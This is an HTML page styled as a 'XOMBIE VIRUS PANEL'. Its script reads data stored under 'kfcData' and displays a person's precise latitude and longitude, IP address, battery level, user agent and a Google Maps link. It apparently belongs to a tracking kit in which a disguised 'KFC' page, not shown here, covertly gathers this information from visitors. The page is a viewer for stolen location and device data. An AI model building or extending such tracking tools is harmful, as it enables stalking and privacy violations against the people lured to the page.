<!DOCTYPE html>
<html>
<head>
  <title>XOMBIE Panel</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: 'Courier New', monospace;
      padding: 20px;
    }
    .box {
      border: 1px solid #0f0;
      padding: 10px;
      margin: 10px 0;
      background: #111;
    }
    a { color: #0af; }
  </style>
</head>
<body>
  <h1>☣️ XOMBIE VIRUS PANEL</h1>
  <div class="box" id="output">Loading...</div>

  <script>
    const data = JSON.parse(localStorage.getItem("kfcData"));
    const output = document.getElementById("output");

    if (data) {
      output.innerHTML = `
        <b>🕒 Time:</b> ${data.time}<br>
        <b>📍 Latitude:</b> ${data.lat}<br>
        <b>📍 Longitude:</b> ${data.lon}<br>
        <b>🎯 Accuracy:</b> ${data.accuracy} meters<br>
        <b>🌐 IP:</b> ${data.ip}<br>
        <b>🔋 Battery:</b> ${data.battery}<br>
        <b>🧠 User Agent:</b> ${data.ua}<br>
        <b>📌 Map:</b> <a href="${data.map}" target="_blank">Open in Google Maps</a>
      `;
    } else {
      output.innerText = "❌ No location data found. Please run the KFC page first.";
    }
  </script>
</body>
</html>
